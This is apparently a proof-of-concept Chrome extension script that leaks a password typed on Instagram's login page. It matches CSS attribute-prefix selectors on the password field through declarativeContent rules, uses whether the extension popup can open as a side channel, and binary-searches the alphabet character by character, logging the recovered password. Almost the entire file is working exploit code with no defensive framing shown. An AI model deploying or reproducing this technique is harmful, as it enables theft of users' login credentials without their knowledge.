const sleep = async (t) => await new Promise(r => setTimeout(r, t));

const ALPHABET = [...'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'];

// adjust (increase) this value depending on how long it takes to open the popup
const TIME_DELAY_MS = 25;

const divideArrayInTwo = (array) => {
  const middle = Math.ceil(array.length / 2);
  return [array.slice(0, middle), array.slice(middle)];
};


chrome.action.disable();

let leakedValue = '';

const setPageStateConditions = async (prefix, alphabet) => {
  await chrome.declarativeContent.onPageChanged.removeRules(undefined);

  let conditions = [];
  for (const char of alphabet) {
    conditions.push(
      new chrome.declarativeContent.PageStateMatcher({
        pageUrl: { hostEquals: 'www.instagram.com', schemes: ['https'] },
        css: ['input[type="password"][value^="' + prefix + char + '"]']
      })
    );
  }

  await chrome.declarativeContent.onPageChanged.addRules([{
    conditions,
    actions: [
      new chrome.declarativeContent.ShowAction()
    ]
  }]);
};

const isPopupOpenable = async () => {
  let error = false;
  try {
    await chrome.action.openPopup();
  } catch (e) {
    error = true;
  }

  return !error;
};

const containsChar = async (prefix, alphabet) => {
  await setPageStateConditions(prefix, alphabet);
  await sleep(TIME_DELAY_MS);

  return await isPopupOpenable();
};

const tryCharAt = async (index, alphabet) => {

  for (const alphabetPart of divideArrayInTwo(alphabet)) {
    if (await containsChar(leakedValue, alphabetPart)) {
      if (alphabetPart.length === 1) {
        leakedValue += alphabetPart[0];
        console.log(leakedValue);
        tryCharAt(++index, ALPHABET);
      } else {
        tryCharAt(index, alphabetPart);
      }
      return;
    }
  }

  console.warn('unknown char or end');
};


(async () => {
  // after enabling the extension, focus the target page
  await sleep(3000);

  // after the page is focused, run:  
  await tryCharAt(0, ALPHABET);
})();
